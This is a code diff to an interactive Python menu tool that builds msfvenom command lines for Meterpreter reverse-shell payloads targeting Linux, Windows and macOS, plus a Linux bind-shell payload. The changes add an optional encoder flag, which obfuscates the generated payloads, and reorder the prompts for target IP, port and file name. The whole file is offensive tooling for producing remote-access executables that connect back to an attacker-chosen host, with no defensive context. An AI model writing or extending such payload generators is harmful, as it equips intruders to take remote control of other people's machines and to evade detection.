@@ -1,3 +1,4 @@
+
 import subprocess
 import sys
 import os
@@ -13,22 +14,35 @@ def execute_command(command, success_message):
     except Exception as e:
         print(f"\033[91mAn unexpected error occurred: {e}\033[0m")
 
-def generate_reverse_shell_payload(payload_ip, payload_port, payload_type, payload_name):
+def generate_reverse_shell_payload(payload_ip, payload_port, payload_type, payload_name, encoder=None):
     if payload_type == 'linux':
-        command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
+        if encoder:
+            command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f elf -e {encoder} -o {payload_name}.elf"
+        else:
+            command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
     elif payload_type == 'windows':
-        command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f exe -o {payload_name}.exe"
+        if encoder:
+            command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f exe -e {encoder} -o {payload_name}.exe"
+        else:
+            command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f exe -o {payload_name}.exe"
     elif payload_type == 'macos':
-        command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f macho -o {payload_name}.macho"
+        if encoder:
+            command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f macho -e {encoder} -o {payload_name}.macho"
+        else:
+            command = f"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={payload_ip} LPORT={payload_port} -f macho -o {payload_name}.macho"
     else:
         print("\033[91mInvalid payload type.\033[0m")
         return
     
     execute_command(command, "\033[92mPayload generated successfully.\033[0m")
 
-def generate_bind_shell_payload(payload_ip, payload_port, payload_name):
-    command = f"msfvenom -p linux/x64/meterpreter/bind_tcp RHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
+def generate_bind_shell_payload(payload_ip, payload_port, payload_name, encoder=None):
+    if encoder:
+        command = f"msfvenom -p linux/x64/meterpreter/bind_tcp RHOST={payload_ip} LPORT={payload_port} -f elf -e {encoder} -o {payload_name}.elf"
+    else:
+        command = f"msfvenom -p linux/x64/meterpreter/bind_tcp RHOST={payload_ip} LPORT={payload_port} -f elf -o {payload_name}.elf"
     execute_command(command, "\033[92mPayload generated successfully.\033[0m")
+
 
 def generate_payload():
     print("\033[94m.--------------------- Payload Generation Menu ---------------------.")
@@ -39,16 +53,18 @@ def generate_payload():
     choice = input("\033[92mEnter your choice: \033[0m")
 
     if choice == '1':
+        payload_type = input("\033[92mEnter the type of payload (linux/windows/macos): \033[0m")
         payload_ip = input("\033[92mEnter the IP address for reverse shell: \033[0m")
         payload_port = input("\033[92mEnter the port for reverse shell: \033[0m")
-        payload_type = input("\033[92mEnter the type of payload (linux/windows/macos): \033[0m")
         payload_name = input("\033[92mEnter the name for the payload file: \033[0m")
-        generate_reverse_shell_payload(payload_ip, payload_port, payload_type, payload_name)
+        encoder = input("\033[92mEnter the encoder (optional): \033[0m")
+        generate_reverse_shell_payload(payload_ip, payload_port, payload_type, payload_name, encoder)
     elif choice == '2':
         payload_ip = input("\033[92mEnter the IP address for bind shell: \033[0m")
         payload_port = input("\033[92mEnter the port for bind shell: \033[0m")
         payload_name = input("\033[92mEnter the name for the payload file: \033[0m")
-        generate_bind_shell_payload(payload_ip, payload_port, payload_name)
+        encoder = input("\033[92mEnter the encoder (optional): \033[0m")
+        generate_bind_shell_payload(payload_ip, payload_port, payload_name, encoder)
     elif choice == '0':
         return
     else:
